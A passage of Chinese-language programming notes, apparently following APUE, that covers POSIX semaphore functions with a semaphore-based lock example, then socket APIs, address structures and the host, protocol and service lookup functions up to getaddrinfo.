class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>pshared</code>：表明是否再多个进程中使用变量<ul><li>是，非零值</li></ul></li><li><code>value</code>：指定了信号量的初始值</li></ul><h3 id="sem-destory"><a href="#sem-destory" class="headerlink" title="sem_destory"></a>sem_destory</h3><p>用于丢弃信号量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_destroy</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<br><br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><h3 id="sem-getvalue"><a href="#sem-getvalue" class="headerlink" title="sem_getvalue"></a>sem_getvalue</h3><p>检索信号量值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sem_getvalue</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *<span class="hljs-keyword">restrict</span> sem, <span class="hljs-type">int</span> *<span class="hljs-keyword">restrict</span> valp)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1.</span><br></code></pre></td></tr></table></figure><ul><li>函数执行成功后，值会被填充到<code>valp</code>中</li></ul><p><strong>15-35.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slock</span>&#123;</span><br>    <span class="hljs-type">sem__t</span> *semp;<br>    <span class="hljs-type">char</span> name[_POSIX_NAME_MAX];<br>&#125;;<br><br><span class="hljs-keyword">struct</span> slock *<br><span class="hljs-title function_">s_alloc</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slock</span> *<span class="hljs-title">sp</span>;</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> cnt;<br><br>    <span class="hljs-keyword">if</span> ((sp = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> slock))) == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-built_in">snprintf</span>(sp-&gt;name, <span class="hljs-keyword">sizeof</span>(sp-&gt;name), <span class="hljs-string">&quot;/%ld.%d&quot;</span>, (<span class="hljs-type">long</span>)getpid(), cnt++); <span class="hljs-comment">//记录信号量的名字</span><br>        sp-&gt;semp = sem_open(sp-&gt;name, O_CREAT|O_EXCL, S_IRWXU, <span class="hljs-number">1</span>); <span class="hljs-comment">//打开了信号量</span><br>    &#125; <span class="hljs-keyword">while</span> (((sp-&gt;semp == SEM_FAILED) &amp;&amp; (errno == EEXIST));<br>    <span class="hljs-keyword">if</span> (sp-&gt;semp == SEM_FAILED)&#123;<br>        <span class="hljs-built_in">free</span>(sp);<br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    sem_unlink(sp-&gt;name);<br>    <span class="hljs-keyword">return</span>(sp);<br>&#125;<br><br><span class="hljs-type">void</span> <br>s_free(<span class="hljs-keyword">struct</span> slock *sp)<br>&#123;<br>    sem_close(sp-&gt;semp);<br>    <span class="hljs-built_in">free</span>(sp);<br>&#125;<br><br><span class="hljs-type">int</span><br>s_lock(<span class="hljs-keyword">struct</span> slock *sp)<br>&#123;<br>    <span class="hljs-keyword">return</span>(sem_wait(sp-&gt;semp));<br>&#125;<br><br><span class="hljs-type">int</span><br>s_trylock(<span class="hljs-keyword">struct</span> slock *sp)<br>&#123;<br>    <span class="hljs-keyword">return</span>(sem_trywait(sp-&gt;semp));<br>&#125;<br><br><span class="hljs-type">int</span><br>s_unlock(<span class="hljs-keyword">struct</span> slock *sp)<br>&#123;<br>    <span class="hljs-keyword">return</span>(sem_post(sp-&gt;semp));<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="网络IPC：套接字"><a href="#网络IPC：套接字" class="headerlink" title="网络IPC：套接字"></a>网络IPC：套接字</h1><h2 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h2><p>套接字是一个端点的抽象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">socket</span><span class="hljs-params">(<span class="hljs-type">int</span> domain, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol)</span>;<br><br><span class="hljs-comment">//返回值：若成功，返回文件（套接字）描述符；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>domain</code>：通信的特性，包括地址格式，各个域的常数以<code>AF_</code>开头，表示地址族<ul><li><code>AF_INET</code>：<code>IPv4</code>因特尔域</li><li><code>AF_INET6</code>：<code>IPv6</code>因特尔域</li><li><code>AF_UNIX</code>：<code>UNIX</code>域</li><li><code>AF_UNSPEC</code>：未指定</li></ul></li><li><code>type</code>：套接字类型<ul><li><code>SOCK_DGRAM</code>：固定长度、无连接的、不可靠的报文传递</li><li><code>SOCK_RAW</code>：<code>IP</code>协议的数据报接口</li><li><code>SOCK_SEQPACKET</code>：固定长度的、有序的、可靠的、面向连接的报文传递</li><li><code>SOCK_STREAM</code>：有序的、可靠的、双向的、面向连接的字节流</li></ul></li><li><code>protocol</code>：协议类型，若为0则使用默认协议<ul><li><code>IPPROTO_IP</code>：<code>IPv4</code>网际协议</li><li><code>IPPROTO_IPV6</code>：<code>IPv6</code>网际协议</li><li><code>IPPROTO_ICMP</code>：控制报文协议</li><li><code>IPPROTO_TCP</code>：传输控制协议</li><li><code>IPPROTO_UDP</code>：用户数据包协议</li></ul></li></ul><p>在<code>Linux</code>内部，套接字被视为文件描述符，但是并不是所有对文件的操作都可以应用在套接字上</p><table><thead><tr><th>函数</th><th>使用套接字时的行为</th></tr></thead><tbody><tr><td>close</td><td>释放套接字</td></tr><tr><td>Dup和dup2</td><td>和一般文件描述符一样复制</td></tr><tr><td>fchdir</td><td>失败，并且将<code>errno</code>设置为<code>ENOTDIR</code></td></tr><tr><td>fchomod</td><td>未指定</td></tr><tr><td>fchown</td><td>由实现定义</td></tr><tr><td>fcntl</td><td>支持一些命令，包括F_DUPFD、F_DUPFD_CLOEXEC、F_GETFD、F_GETEFL、F_GETOWN、F_SETFD、F_SETFL和F_SETOWN</td></tr><tr><td>Fdatasync和fsync</td><td>由实现定义</td></tr><tr><td>fstat</td><td>支持部分stat结构体成员，具体由实现定义</td></tr><tr><td>ftruncate</td><td>未指定</td></tr><tr><td>ioctl</td><td>支持部分命令，依赖于底层设备驱动</td></tr><tr><td>lseek</td><td>由实现的定义（通常失败时会将errno设为ESPIPE）</td></tr><tr><td>mmap</td><td>未指定</td></tr><tr><td>poll</td><td>正常工作</td></tr><tr><td>Pread和Pwrite</td><td>失败是会将errno设为ESPIPE</td></tr><tr><td>read和readv</td><td>与没有任何标志位的recv等价</td></tr><tr><td>select</td><td>正常工作</td></tr><tr><td>write和writev</td><td>与没有任何标志位的send等价</td></tr></tbody></table><h2 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h2><p>用来禁止一个套接字的<code>I/O</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> how)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>how</code>：用于指定禁止的行为<ul><li><code>SHUT_RD</code>：关闭读端，无法从套接字读取数据 </li><li><code>SHUT_WR</code>：关闭写端，无法从套接字发送数据</li><li><code>SHUT_RDWR</code>：关闭读写端，即无法从套接字发送数据也无法读取数据</li></ul></li></ul><h2 id="字节序转换"><a href="#字节序转换" class="headerlink" title="字节序转换"></a>字节序转换</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">htonl</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> hostint32)</span>;<br><span class="hljs-comment">//返回值：以网络字节序表示的32位整数</span><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">htons</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> hostint16)</span>;<br><span class="hljs-comment">//返回值：以网络字节序表示的16位整数</span><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">ntohl</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> netint32)</span>;<br><span class="hljs-comment">//返回值：以主机字节序表示的32位整数</span><br><span class="hljs-type">uint16_t</span> <span class="hljs-title function_">ntohs</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> netint16)</span>;<br><span class="hljs-comment">//返回值：以主机字节序表示的16位整数</span><br></code></pre></td></tr></table></figure><h2 id="地址格式"><a href="#地址格式" class="headerlink" title="地址格式"></a>地址格式</h2><p>为了使不同的地址都能够传入<code>socket</code>中，<code>Linux</code>使用相同的结构体管理地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> &#123;</span><br>    <span class="hljs-type">sa_family_t</span> sa_family; <span class="hljs-comment">//地址族</span><br>    <span class="hljs-type">char</span> sa_data[<span class="hljs-number">14</span>]; <span class="hljs-comment">//地址长度</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>IPv4</code>因特网域，套接字使用<code>sockaddr_in</code>表示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span>&#123;</span><br><span class="hljs-type">in_addr_t</span> s_addr; <span class="hljs-comment">//IPv4地址</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> &#123;</span><br>    <span class="hljs-type">sa_family_t</span> sin_family; <span class="hljs-comment">//地址族</span><br>    <span class="hljs-type">in_port_t</span> sin_port; <span class="hljs-comment">//端口号</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">sin_addr</span>;</span> <span class="hljs-comment">//IPv4地址</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>IPv6</code>因特网域，套接字使用<code>sockaddr_in6</code>表示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">struct_in6_addr&#123;<br><span class="hljs-type">uint8_t</span> sa_addr[<span class="hljs-number">16</span>];<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in6</span>&#123;</span><br>  <span class="hljs-type">sa_faimly_t</span> sin6_family; <span class="hljs-comment">//地址族</span><br>  <span class="hljs-type">in_port_t</span> sin6_port; <span class="hljs-comment">//端口号</span><br>  <span class="hljs-type">uint32_t</span> sin6_flowinfo; <span class="hljs-comment">//流信息相关，暂时未实现</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in6_addr</span> <span class="hljs-title">sin6_addr</span>;</span> <span class="hljs-comment">//IPv6的地址</span><br>  <span class="hljs-type">uint32_t</span> sin6_scope_id; <span class="hljs-comment">//范围接口集</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在<code>Linux</code>中，<code>sockaddr_in</code>的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> &#123;</span><br>    <span class="hljs-type">sa_family_t</span> sin_family; <span class="hljs-comment">//地址族</span><br>    <span class="hljs-type">in_port_t</span> sin_port; <span class="hljs-comment">//端口号</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">sin_addr</span>;</span> <span class="hljs-comment">//IPv4地址</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sin_zero[<span class="hljs-number">8</span>]; <span class="hljs-comment">//填充字段</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="inet-ntop和inet-pton"><a href="#inet-ntop和inet-pton" class="headerlink" title="inet_ntop和inet_pton"></a>inet_ntop和inet_pton</h2><p>用于二进制地址格式与点分十进制字符表示之间的相互转换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">inet_ntop</span><span class="hljs-params">(<span class="hljs-type">int</span> domain, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *<span class="hljs-keyword">restrict</span> addr,</span><br><span class="hljs-params">                     <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> str, <span class="hljs-type">socklen_t</span> size)</span>;<br><span class="hljs-comment">//返回值：若成功，返回地址字符串指针；若出错，返回NULL</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">inet_pton</span><span class="hljs-params">(<span class="hljs-type">int</span> domain, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-keyword">restrict</span> str, <span class="hljs-type">void</span> *<span class="hljs-keyword">restrict</span> addr)</span>;<br><span class="hljs-comment">//返回值：若成功，返回1；若格式无效，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><h2 id="gethostent"><a href="#gethostent" class="headerlink" title="gethostent"></a>gethostent</h2><p>网络配置信息被存放在许多地方，例如在静态文件中<code>/etc/hosts</code>和<code>/etc/services</code>，名字服务管理，如域名系统或者网络信息服务。通过<code>gethostent</code>，都可以找到给定计算机系统的主机信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><br><span class="hljs-keyword">struct</span> hostent *<span class="hljs-title function_">gethostent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-comment">//返回值：若成功，返回指针；若出错，返回NULL</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sethostent</span><span class="hljs-params">(<span class="hljs-type">int</span> stayopen)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">endhostent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><p><code>hostent</code>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hostent</span>&#123;</span><br>    <span class="hljs-type">char</span> *h_name, <span class="hljs-comment">//主机名</span><br>    <span class="hljs-type">char</span> **h_aliases; <span class="hljs-comment">//别名</span><br>    <span class="hljs-type">int</span> h_addrtype; <span class="hljs-comment">//地址类型</span><br>    <span class="hljs-type">int</span> h_length; <span class="hljs-comment">//地址长度</span><br>    <span class="hljs-type">char</span> **h_addr_list; <span class="hljs-comment">//指向网络地址数组</span><br>    ...<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="getnetbyaddr和getnetbyname"><a href="#getnetbyaddr和getnetbyname" class="headerlink" title="getnetbyaddr和getnetbyname"></a>getnetbyaddr和getnetbyname</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><br><span class="hljs-keyword">struct</span> netent *<span class="hljs-title function_">getnetbyaddr</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span> net, <span class="hljs-type">int</span> type)</span>;<br><span class="hljs-keyword">struct</span> netent *<span class="hljs-title function_">getnetbyname</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><br><span class="hljs-keyword">struct</span> netent *<span class="hljs-title function_">getnetent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">setnetent</span><span class="hljs-params">(<span class="hljs-type">int</span> stayopen)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">endnetent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-comment">//若成功返回指针， 若出错返回NULL</span><br></code></pre></td></tr></table></figure><p><code>netent</code>结构包含以下字段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">netent</span> &#123;</span><br><span class="hljs-type">char</span> *n_name;<br><span class="hljs-type">char</span> **n_aliases;<br><span class="hljs-type">int</span> n_addrtype;<br><span class="hljs-type">uint32_t</span> n_net;<br>...<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="协议名字和协议编号之间映射"><a href="#协议名字和协议编号之间映射" class="headerlink" title="协议名字和协议编号之间映射"></a>协议名字和协议编号之间映射</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><br><span class="hljs-keyword">struct</span> protoent *<span class="hljs-title function_">getprotobyname</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-keyword">struct</span> protoent *<span class="hljs-title function_">getprotobynumber</span><span class="hljs-params">(<span class="hljs-type">int</span> proto)</span>;<br><span class="hljs-keyword">struct</span> protoent *<span class="hljs-title function_">getprotoent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-comment">//若成功，返回指针；若出错，返回NULL</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setprotoent</span><span class="hljs-params">(<span class="hljs-type">int</span> stayopen)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">endprotoent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><p><code>protoent</code>结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">protoent</span>&#123;</span><br>    <span class="hljs-type">char</span> *p_name; <span class="hljs-comment">//协议名</span><br>    <span class="hljs-type">char</span> **p_aliases; <span class="hljs-comment">//别名</span><br>    <span class="hljs-type">int</span> p_proto; <span class="hljs-comment">//协议号</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="端口与服务映射"><a href="#端口与服务映射" class="headerlink" title="端口与服务映射"></a>端口与服务映射</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><br><span class="hljs-keyword">struct</span> servent *<span class="hljs-title function_">getservbyname</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *proto)</span>;<br><span class="hljs-keyword">struct</span> servent *<span class="hljs-title function_">getserbyport</span><span class="hljs-params">(<span class="hljs-type">int</span> port, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *proto)</span>;<br><span class="hljs-keyword">struct</span> servent *<span class="hljs-title function_">getsetvent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-comment">//若成功，返回指针，若出错，返回NULL</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setservent</span><span class="hljs-params">(<span class="hljs-type">int</span> stayopen)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">endservent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><p><code>servent</code>结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">servent</span>&#123;</span><br>    <span class="hljs-type">char</span> *s_name; <span class="hljs-comment">//服务名</span><br>    <span class="hljs-type">char</span> **s_aliases; <span class="hljs-comment">//别名</span><br>    <span class="hljs-type">int</span> s_port; <span class="hljs-comment">//端口号</span><br>    <span class="hljs-type">char</span> *s_proto; <span class="hljs-comment">//协议名</span><br>    ...<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="getaddrinfo"><a href="#getaddrinfo" class="headerlink" title="getaddrinfo"></a>getaddrinfo</h2><p><code>getaddrinfo</code>函数允许将一个主机名和一个服务名映射到一个地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getaddrinfo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> host,</span><br><span class="hljs-params">               <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> service,</span><br><span class="hljs-params">               <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> addrinfo *<span class="hljs-keyword">restrict</span> hint,</span><br><span class="hljs-params">               <span class="hljs-keyword">struct</span> addrinfo **<span class="hljs-keyword">restrict</span> res)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回非0错误码</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">freeaddrinfo</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> addrinfo *ai)</span>;<br></code></pre></td></tr></table></figure><p><code>getaddrinfo</code>函数返回一个链表结构<code>addrinfo</code>。可以用<code>freeaddrinfo</code>来释放一个或多个这种结构，取决于用<code>ai_next</code>字段链接起来的结构有多少。</p><p><code>addrinfo</code>结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span>&#123;</span><br>    <span class="hljs-type">int</span> ai_flags; <span class="hljs-comment">//自定义行为</span><br>    <span class="hljs-type">int</span> ai_family; <span class="hljs-comment">//地址族</span><br>    <span class="hljs-type">int</span> ai_socktype; <span class="hljs-comment">//socket的类型</span><br>    <span class="hljs-type">int</span> ai_protocol; <span class="hljs-comment">//协议</span><br>    <span class="hljs-type">socklen_t</span> ai_addrlen; <span class="hljs-comment">//地址长度</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">ai_addr</span>;</span> <span class="hljs-comment">//地址</span><br>    <span class="hljs-type">char</span> *ai_canonname; <span class="hljs-comment">//主机的规范名称</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> *<span class="hljs-title">ai_next</span>;</span> <span class="hljs-comment">//链表的下一个</span><br>    